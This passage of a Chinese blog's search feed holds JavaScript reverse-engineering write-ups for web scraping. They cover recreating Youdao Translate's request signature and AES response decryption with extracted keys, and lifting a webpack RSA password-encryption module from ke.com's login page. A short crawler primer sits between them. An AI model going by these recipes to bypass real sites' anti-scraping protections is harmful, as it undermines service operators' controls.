alt="image.png"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有道翻译结果逆向</title>
      <link href="/rejs/9a001d52cecc/"/>
      <url>/rejs/9a001d52cecc/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向目标"><a href="#逆向目标" class="headerlink" title="逆向目标"></a>逆向目标</h1><ul><li>地址：<a href="https://fanyi.youdao.com/index.html#/">https://fanyi.youdao.com/index.html#/</a></li><li>目标：有道翻译接口参数</li><li>逆向参数：<ul><li>sign</li><li>返回值</li></ul></li></ul><hr><h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302132157078.png" alt="image.png"><br>抓包看到需要计算的值只有sign，搜索sign比较多，找个别的关键字搜一下<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302132201564.png" alt="image.png"><br>定位到计算位置，下断点<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302132202910.png" alt="image.png"><br>断下来发现t就是时间戳，e是一串文本，换了个浏览器发现是固定的，然后跟进去看函数b是什么<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302132205550.png" alt="image.png"><br>b中又调用了p函数，传递了一个字符串，最终可以看到p就是一个md5，然后计算sign就行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> secretKey = <span class="string">&#x27;fsdsogkndfokasodnaso&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = <span class="string">&#x27;fanyideskweb&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="string">&#x27;webfanyi&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">MD5</span>_Encrypt(<span class="string">&#x27;client=&#x27;</span>+r+<span class="string">&#x27;&amp;mysticTime=&#x27;</span>+e+<span class="string">&#x27;&amp;product=&#x27;</span>+i+<span class="string">&#x27;&amp;key=&#x27;</span>+t)<span class="comment">//md5加密</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sign</span>(<span class="params">t</span>)&#123;</span><br><span class="line">    sign = <span class="title function_">b</span>(t,secretKey);<span class="comment">//t 13位时间戳</span></span><br><span class="line">    <span class="keyword">return</span> sign;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>定位到返回值从加密到明文的位置<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302211908518.png" alt="image.png"></p><p>大致的解密过程如下，可以看到使用的是aes-128-cbc，然后看o和n的值，一个有key一个是iv，很明显了，所以最终aes算法的密钥（key）就是a，偏移（iv）就是r，函数m如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> O = <span class="function">(<span class="params">t,o,n</span>)=&gt;</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!t)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">const</span> a = e.<span class="title function_">alloc</span>(<span class="number">16</span>, <span class="title function_">m</span>(o))</span><br><span class="line">                  , r = e.<span class="title function_">alloc</span>(<span class="number">16</span>, <span class="title function_">m</span>(n))</span><br><span class="line">                  , i = c.<span class="property">a</span>.<span class="title function_">createDecipheriv</span>(<span class="string">&quot;aes-128-cbc&quot;</span>, a, r);</span><br><span class="line">                <span class="keyword">let</span> s = i.<span class="title function_">update</span>(t, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> s += i.<span class="title function_">final</span>(<span class="string">&quot;utf-8&quot;</span>),</span><br><span class="line">                s</span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> c.<span class="property">a</span>.<span class="title function_">createHash</span>(<span class="string">&quot;md5&quot;</span>).<span class="title function_">update</span>(e).<span class="title function_">digest</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302211911727.png" alt="image.png"><br>最终用nodejs实现的解密为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)  </span><br><span class="line"><span class="keyword">var</span> key = <span class="string">&#x27;ydsecret://query/key/B*RGygVywfNBwpmBaZg*WT7SIOUP2T0C9WHMZN39j^DAdaZhAnxvGcCY6VYFwnHl&#x27;</span>  </span><br><span class="line"><span class="keyword">var</span> iv = <span class="string">&#x27;ydsecret://query/iv/C@lZe2YzHtZ2CYgaXKSVfsb7Y4QWHjITPPZ0nQp87fBeJ!Iv6v^6fvi2WN@bYpJ4&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">alloc</span>(<span class="params">strs</span>)&#123;  </span><br><span class="line">    <span class="keyword">const</span> m1 = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">16</span>,m1.<span class="title function_">update</span>(strs).<span class="title function_">digest</span>())  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">data</span>)&#123;  </span><br><span class="line">    <span class="keyword">const</span> a = <span class="title function_">alloc</span>(key),  </span><br><span class="line">    r = <span class="title function_">alloc</span>(iv),  </span><br><span class="line">    i = crypto.<span class="title function_">createDecipheriv</span>(<span class="string">&quot;aes-128-cbc&quot;</span>,a,r);  </span><br><span class="line">    <span class="keyword">let</span> s = i.<span class="title function_">update</span>(data,<span class="string">&#x27;base64&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> s+=i.<span class="title function_">final</span>(<span class="string">&#x27;utf-8&#x27;</span>),s;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种解决办法就是扣出webpack的代码，但是扣了两次发现实在是太多了，几乎将整个js代码全都扣下来了。这里就不贴代码了，后面放上代码的链接。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://pychong.com/article/22.html">http://pychong.com/article/22.html</a></p>]]></content>
      
      
      <categories>
          
          <category> js逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【爬虫逆向进阶实战】第一章</title>
      <link href="/pachongnixiangjinjieshizhan/8797d3584961/"/>
      <url>/pachongnixiangjinjieshizhan/8797d3584961/</url>
      
        <content type="html"><![CDATA[<p>爬虫任务的流程：确定采集目标、发起请求、数据解析、数据存储<br>打开一次网页都会发生什么：</p><ol><li>DNS解析：将域名解析成ip地址</li><li>tcp连接：tcp三次握手</li><li>发送报文：发送HTTP请求报文</li><li>接收响应：服务器处理请求并返回HTTP保温</li><li>页面渲染：浏览器解析渲染页面</li><li>断开连接：TCP四次挥手</li></ol><h2 id="分布式爬虫框架"><a href="#分布式爬虫框架" class="headerlink" title="分布式爬虫框架"></a>分布式爬虫框架</h2><h3 id="主从分布式"><a href="#主从分布式" class="headerlink" title="主从分布式"></a>主从分布式</h3><p>采用master-slaver体系，一个master多个slaver，master是主控直接点，负责任务管理调度分发；slaver是工作子节点，负责采集、解析存储。常见的分布式框架python有Scrapy-Redis、java的WebMagic和go的Zerg。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302211702703.png" alt="image.png"></p><h3 id="对等分布式"><a href="#对等分布式" class="headerlink" title="对等分布式"></a>对等分布式</h3><p>所有工作节点没有主从之分</p><h2 id="遍历的策略"><a href="#遍历的策略" class="headerlink" title="遍历的策略"></a>遍历的策略</h2><h3 id="广度优先"><a href="#广度优先" class="headerlink" title="广度优先"></a>广度优先</h3><h3 id="深度优先"><a href="#深度优先" class="headerlink" title="深度优先"></a>深度优先</h3><h3 id="最佳优先策略"><a href="#最佳优先策略" class="headerlink" title="最佳优先策略"></a>最佳优先策略</h3>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某壳网登录</title>
      <link href="/rejs/931e8524edb8/"/>
      <url>/rejs/931e8524edb8/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向目标"><a href="#逆向目标" class="headerlink" title="逆向目标"></a>逆向目标</h1><ul><li>地址：<a href="https://bj.ke.com/">https://bj.ke.com/</a></li><li>目标：登录中的密码加密</li><li>参数：password</li></ul><hr><h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302141518132.png" alt="image.png"><br>多次尝试发现password是会变化的，搜索关键字定位，搜索<code>mainAuthMethodName</code>关键字，找到几个位置，然后下断点，断下来了之后继续分析<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151345015.png" alt="image.png"><br>可以看到这里像是对密码进行了加密，在控制台进行测试证实就是这里。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151346936.png" alt="image.png"><br>跟进去到这个函数定义的地方，主要有两部分组成，一个是l()一个是this.getKey().encrypt()，l()函数很简单，跟进去直接就能找到<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151348010.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> e, n, r = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (e = <span class="number">0</span>; e + <span class="number">3</span> &lt;= t.<span class="property">length</span>; e += <span class="number">3</span>)</span><br><span class="line">n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">3</span>), <span class="number">16</span>),</span><br><span class="line">r += a.<span class="title function_">charAt</span>(n &gt;&gt; <span class="number">6</span>) + a.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; n);</span><br><span class="line"><span class="keyword">for</span> (e + <span class="number">1</span> == t.<span class="property">length</span> ? (n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">1</span>), <span class="number">16</span>),</span><br><span class="line">r += a.<span class="title function_">charAt</span>(n &lt;&lt; <span class="number">2</span>)) : e + <span class="number">2</span> == t.<span class="property">length</span> &amp;&amp; (n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">2</span>), <span class="number">16</span>),</span><br><span class="line">r += a.<span class="title function_">charAt</span>(n &gt;&gt; <span class="number">2</span>) + a.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; n) &lt;&lt; <span class="number">4</span>)); <span class="number">0</span> &lt; (<span class="number">3</span> &amp; r.<span class="property">length</span>); )</span><br><span class="line">r += <span class="string">&quot;=&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是看剩下的部分，这个js是由webpack打包的，所以后面的工作主要就是抠出加密代码。<br>首先找到加载器（一般都在最前面），定义一个全局变量，把加载器赋值给全局变量，查看该变量。可以看到一共有59个方法。但是要怎么从中找到我们需要的方法呢，也就是加密的方法。<br>加载器的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aaa;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r[t])</span><br><span class="line">            <span class="keyword">return</span> r[t].<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> e = r[t] = &#123;</span><br><span class="line">            <span class="attr">i</span>: t,</span><br><span class="line">            <span class="attr">l</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[t].<span class="title function_">call</span>(e.<span class="property">exports</span>, e, e.<span class="property">exports</span>, i),</span><br><span class="line">        e.<span class="property">l</span> = !<span class="number">0</span>,</span><br><span class="line">        e.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">    i.<span class="property">m</span> = n,</span><br><span class="line">    i.<span class="property">c</span> = r,</span><br><span class="line">    i.<span class="property">d</span> = <span class="keyword">function</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        i.<span class="title function_">o</span>(t, e) || <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(t, e, &#123;</span><br><span class="line">            <span class="attr">enumerable</span>: !<span class="number">0</span>,</span><br><span class="line">            <span class="attr">get</span>: n</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    i.<span class="property">r</span> = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> <span class="title class_">Symbol</span> &amp;&amp; <span class="title class_">Symbol</span>.<span class="property">toStringTag</span> &amp;&amp; <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(t, <span class="title class_">Symbol</span>.<span class="property">toStringTag</span>, &#123;</span><br><span class="line">            <span class="attr">value</span>: <span class="string">&quot;Module&quot;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(t, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    i.<span class="property">t</span> = <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> &amp; t &amp;&amp; (e = <span class="title function_">i</span>(e)),</span><br><span class="line">        <span class="number">8</span> &amp; t)</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">4</span> &amp; t &amp;&amp; <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; e &amp;&amp; e.<span class="property">__esModule</span>)</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">        <span class="keyword">var</span> n = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (i.<span class="title function_">r</span>(n),</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(n, <span class="string">&quot;default&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">enumerable</span>: !<span class="number">0</span>,</span><br><span class="line">            <span class="attr">value</span>: e</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="number">2</span> &amp; t &amp;&amp; <span class="string">&quot;string&quot;</span> != <span class="keyword">typeof</span> e)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r <span class="keyword">in</span> e)</span><br><span class="line">                i.<span class="title function_">d</span>(n, r, <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e[t]</span><br><span class="line">                &#125;</span><br><span class="line">                .<span class="title function_">bind</span>(<span class="literal">null</span>, r));</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    i.<span class="property">n</span> = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = t &amp;&amp; t.<span class="property">__esModule</span> ? <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="property">default</span></span><br><span class="line">        &#125;</span><br><span class="line">        : <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        <span class="keyword">return</span> i.<span class="title function_">d</span>(e, <span class="string">&quot;a&quot;</span>, e),</span><br><span class="line">        e</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    i.<span class="property">o</span> = <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(t, e)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    i.<span class="property">p</span> = <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    aaa = i;</span><br><span class="line">    <span class="title function_">i</span>(i.<span class="property">s</span> = <span class="number">20</span>)</span><br><span class="line">&#125;(&#123;</span><br><span class="line"><span class="number">50</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line"> <span class="number">5</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151353454.png" alt="image.png"><br>这里用这样一个遍历来寻找</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaa.<span class="property">m</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">element, index</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(element.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;o.ec.encrypt&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(index)</span><br><span class="line">    &#125;&#125;)</span><br></pre></td></tr></table></figure><p>得到下标为50，然后打印出第50个的函数进行定位<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151504469.png" alt="image.png"><br>然后将他复制出来（再打印出第51个的位置，中间就是第50个函数），复制到加载器最后的对象中，然后进行调用<code>aaa(50).default()</code>发现报错了。<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151520996.png" alt="image.png"><br>在报错前面打印出来报错信息，t打印出来是一个下标，就表示需要的函数，t现在显示的是5<br>所以我们就需要把第5个函数继续复制出来，就这样一直报错一直复制，最后把需要的函数都复制全了之后是下面这个样子的<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302151522912.png" alt="image.png"><br>然后再调用就可以正常运行了，下面是调用的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="title function_">aaa</span>(<span class="number">50</span>).<span class="title function_">default</span>();  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPassword</span>(<span class="params">pass</span>)&#123;  </span><br><span class="line">    <span class="keyword">var</span> e = <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCCB81pk1Go/d7K8unYqeB6YyQdDgIRsLji7BxlBfMC2U8/0lyOLxJ6sQb1RmKaILuxN0hRci4zWPfkkPhttWaogq3XABYiDYbx0843ge4D79pG21+qWplw43uHZNs0B6iUChJW1O3DDJPXGwj50L1ySTVt7G7iqsIr9PLZVRSZmQIDAQAB&quot;</span>;  </span><br><span class="line">    ddd.<span class="property">ec</span>.<span class="title function_">setPublicKey</span>(e);  </span><br><span class="line">    ddd.<span class="property">publicKey</span> = e;  </span><br><span class="line">    <span class="comment">// console.log(ddd.ec.encrypt(&quot;a123456789&quot;))  </span></span><br><span class="line">    <span class="keyword">return</span> ddd.<span class="property">ec</span>.<span class="title function_">encrypt</span>(<span class="string">&quot;a123456789&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getPassword</span>(<span class="string">&quot;a123456789&quot;</span>));</span><br></pre></td></tr></table></figure><p>使用得到的结果进行登录测试，成功登录<br><img src="https://raw.githubusercontent.com/fc8/Picrepository/master/202302141650850.png" alt="image.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1QS4y1i7vp/?spm_id_from=333.880.my_history.page.click&vd_source=cf89b02a7fa60e83cc9a96e5b7136de2">https://www.bilibili.com/video/BV1QS4y1i7vp/?spm_id_from=333.880.my_history.page.click&amp;vd_source=cf89b02a7fa60e83cc9a96e5b7136de2</a><br><a href="https://blog.csdn.net/Python_DJ/article/details/125419181">https://blog.csdn.net/Python_DJ/article/details/125419181</a></p>]]></content>
      
      
      <categories>
          
          <category> js逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
